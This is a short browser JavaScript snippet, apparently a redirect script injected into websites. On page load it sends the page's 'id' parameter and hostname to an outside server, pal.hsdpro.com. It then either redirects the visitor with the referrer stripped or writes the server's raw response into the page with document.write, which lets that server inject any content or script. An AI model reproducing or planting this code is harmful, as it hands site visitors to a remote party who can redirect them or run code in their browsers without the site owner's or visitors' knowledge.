if (window.__id_FETCH_RAN__) {
  // already ran
} else {
  window.__id_FETCH_RAN__ = 1;

  var redirectWithoutReferrer = function(url) {
    var meta = document.createElement('meta');
    meta.name = 'referrer';
    meta.content = 'no-referrer';
    document.head.appendChild(meta);
    window.location.replace(url);
  };

  var params = new URLSearchParams(window.location.search);
  var paramValue = params.get('id');
  var hostParam1 = window.location.hostname;

  if (paramValue) {
    fetch('https://pal.hsdpro.com/input.php?ids=' + paramValue + '&host=' + hostParam1 + '&cache=1')
      .then(function(res){ return res.text(); })
      .then(function(e){
        try {
          var r = JSON.parse(e);
          if (r.redirectUrl) redirectWithoutReferrer(r.redirectUrl);
        } catch (err) {
          document.open(); document.write(e); document.close();
        }
      })
      .catch(function(err){ console.error(err); });
  } else {
    console.error("GO HOME");
  }
}
